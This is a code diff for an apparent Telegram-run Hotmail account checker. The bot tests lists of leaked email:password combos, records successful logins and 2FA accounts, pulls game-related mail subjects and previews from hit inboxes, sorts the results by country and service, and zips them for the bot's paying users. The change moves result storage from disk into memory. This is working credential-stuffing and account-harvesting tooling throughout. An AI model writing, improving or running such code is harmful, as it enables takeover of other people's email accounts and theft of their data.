@@ -1,4 +1,4 @@
-import sys, os, re, json, time, random, threading, requests, zipfile, shutil
+import sys, os, re, json, time, random, threading, requests, zipfile, io
 from urllib.parse import urlparse, parse_qs
 from datetime import datetime, timedelta
 import urllib3
@@ -16,10 +16,6 @@ ADMIN_THREAD = 10
 
 KEY_FILE = "keys.json"
 USER_FILE = "users.json"
-
-TWOFA_DIR = "2fa"
-COUNTRIES_DIR = "countries"
-KEYWORDS_DIR = "keywords"
 ZIP_FILE = "hotmailgamechecker.zip"
 
 user_proxies = {}
@@ -626,93 +622,6 @@ class marazali:
 
 
 # ============================================================
-# DOSYA YAZIMI
-# ============================================================
-
-def _ensure_dir(d):
-    if not os.path.isdir(d):
-        try:
-            os.makedirs(d, exist_ok=True)
-        except:
-            pass
-
-
-def ulke_yaz(ulke, satir):
-    u = (ulke or "Unknown").upper().strip()
-    if not u or u == "UNKNOWN" or len(u) > 3:
-        u = "Unknown"
-    _ensure_dir(COUNTRIES_DIR)
-    try:
-        with open(f"{COUNTRIES_DIR}/{u}.txt", "a", encoding="utf-8") as f:
-            f.write(satir + "\n")
-    except:
-        pass
-
-
-def keyword_yaz(servis, satir):
-    _ensure_dir(KEYWORDS_DIR)
-    try:
-        with open(f"{KEYWORDS_DIR}/{servis}.txt", "a", encoding="utf-8") as f:
-            f.write(satir + "\n")
-    except:
-        pass
-
-
-def ikiFA_yaz(combo):
-    _ensure_dir(TWOFA_DIR)
-    try:
-        with open(f"{TWOFA_DIR}/2fa.txt", "a", encoding="utf-8") as f:
-            f.write(combo + "\n")
-    except:
-        pass
-
-
-def zip_olustur(ulke_sayaci, keyword_sayaci):
-    tarih = datetime.now().strftime('%d-%m-%Y')
-    try:
-        with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zf:
-            if os.path.isdir(TWOFA_DIR):
-                for f in os.listdir(TWOFA_DIR):
-                    if f.endswith(".txt"):
-                        p = os.path.join(TWOFA_DIR, f)
-                        if os.path.getsize(p) > 0:
-                            zf.write(p, f"2fa/{f}")
-            if os.path.isdir(COUNTRIES_DIR):
-                for f in os.listdir(COUNTRIES_DIR):
-                    if f.endswith(".txt"):
-                        p = os.path.join(COUNTRIES_DIR, f)
-                        if os.path.getsize(p) > 0:
-                            kod = f.replace(".txt", "")
-                            n = ulke_sayaci.get(kod, 0)
-                            zf.write(p, f"countries/{kod} ({n} hit) ({tarih}).txt")
-            if os.path.isdir(KEYWORDS_DIR):
-                for f in os.listdir(KEYWORDS_DIR):
-                    if f.endswith(".txt"):
-                        p = os.path.join(KEYWORDS_DIR, f)
-                        if os.path.getsize(p) > 0:
-                            svc = f.replace(".txt", "")
-                            n = keyword_sayaci.get(svc, 0)
-                            zf.write(p, f"keywords/{svc} ({n} hit) ({tarih}).txt")
-        return True
-    except:
-        return False
-
-
-def klasorleri_temizle():
-    for d in [TWOFA_DIR, COUNTRIES_DIR, KEYWORDS_DIR]:
-        if os.path.isdir(d):
-            for f in os.listdir(d):
-                p = os.path.join(d, f)
-                try:
-                    if os.path.isfile(p):
-                        os.remove(p)
-                except:
-                    pass
-        else:
-            _ensure_dir(d)
-
-
-# ============================================================
 # MENÜLER
 # ============================================================
 
@@ -897,12 +806,11 @@ def bakim(chat_id):
 
 
 # ============================================================
-# TARAMA
+# TARAMA — RAM TABANLI
 # ============================================================
 
 def tarama_yap(chat_id, accounts, dosya_adi):
     global ADMIN_THREAD
-    klasorleri_temizle()
 
     plan_name = get_user_plan(chat_id)
     plan_info = get_plan_info(plan_name)
@@ -915,6 +823,11 @@ def tarama_yap(chat_id, accounts, dosya_adi):
     egriegri = {"checked": 0, "hit": 0, "bad": 0, "twofa": 0, "errors": 0}
     keyword_sayaci = {}
     ulke_sayaci = {}
+    ulke_icerik = {}
+    keyword_icerik = {}
+    twofa_icerik = []
+    all_hits_icerik = []
+
     lock = threading.Lock()
     semaphore = threading.BoundedSemaphore(thread_sayisi)
 
@@ -935,9 +848,12 @@ def tarama_yap(chat_id, accounts, dosya_adi):
             with lock:
                 if status == "SUCCESS":
                     egriegri["hit"] += 1
-                    ulke = c.country or "Unknown"
+                    ulke = (c.country or "Unknown").upper().strip()
+                    if not ulke or len(ulke) > 3:
+                        ulke = "Unknown"
                     isim = c.name or ""
                     ulke_sayaci[ulke] = ulke_sayaci.get(ulke, 0) + 1
+                    all_hits_icerik.append(combo)
                     if mesaj_info:
                         for game_key, game_data in mesaj_info.items():
                             sayi = game_data.get("sayi", 0)
@@ -966,11 +882,15 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                                         satir += f" | Subject: {subj}"
                                     if prev:
                                         satir += f" | Preview: {prev}"
-                                keyword_yaz(game_key, satir)
-                                ulke_yaz(ulke, satir)
+                                if game_key not in keyword_icerik:
+                                    keyword_icerik[game_key] = []
+                                keyword_icerik[game_key].append(satir)
+                                if ulke not in ulke_icerik:
+                                    ulke_icerik[ulke] = []
+                                ulke_icerik[ulke].append(satir)
                 elif status == "2FA":
                     egriegri["twofa"] += 1
-                    ikiFA_yaz(combo)
+                    twofa_icerik.append(combo)
                 else:
                     egriegri["bad"] += 1
         except Exception:
@@ -1039,7 +959,33 @@ def tarama_yap(chat_id, accounts, dosya_adi):
     for t in threads:
         t.join()
 
-    zip_olustu = zip_olustur(ulke_sayaci, keyword_sayaci)
+    tarih = datetime.now().strftime('%d-%m-%Y')
+    try:
+        with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zf:
+            if all_hits_icerik:
+                buf = io.StringIO()
+                for line in all_hits_icerik:
+                    buf.write(line + "\n")
+                zf.writestr("all_hits.txt", buf.getvalue())
+            if twofa_icerik:
+                buf = io.StringIO()
+                for line in twofa_icerik:
+                    buf.write(line + "\n")
+                zf.writestr("2fa.txt", buf.getvalue())
+            for kod, satirlar in ulke_icerik.items():
+                buf = io.StringIO()
+                for line in satirlar:
+                    buf.write(line + "\n")
+                n = ulke_sayaci.get(kod, len(satirlar))
+                zf.writestr(f"countries/{kod} ({n} hit) ({tarih}).txt", buf.getvalue())
+            for svc, satirlar in keyword_icerik.items():
+                buf = io.StringIO()
+                for line in satirlar:
+                    buf.write(line + "\n")
+                n = keyword_sayaci.get(svc, len(satirlar))
+                zf.writestr(f"keywords/{svc} ({n} hit) ({tarih}).txt", buf.getvalue())
+    except Exception as e:
+        print(f"[ZIP ERROR] {e}", flush=True)
 
     ozet = f"✔️ {egriegri['hit']}x Hotmail Hit\n\n"
     ozet += f"📊 Toplam Hit: {egriegri['hit']}\n"
@@ -1051,7 +997,7 @@ def tarama_yap(chat_id, accounts, dosya_adi):
     ozet += f"🔥 Hit By : @imkansizligim"
     send_message(chat_id, ozet)
 
-    if zip_olustu:
+    if os.path.exists(ZIP_FILE) and os.path.getsize(ZIP_FILE) > 0:
         send_document(chat_id, ZIP_FILE)
 
     if chat_id in bekleyen_hesaplar and bekleyen_hesaplar[chat_id].get("accounts"):
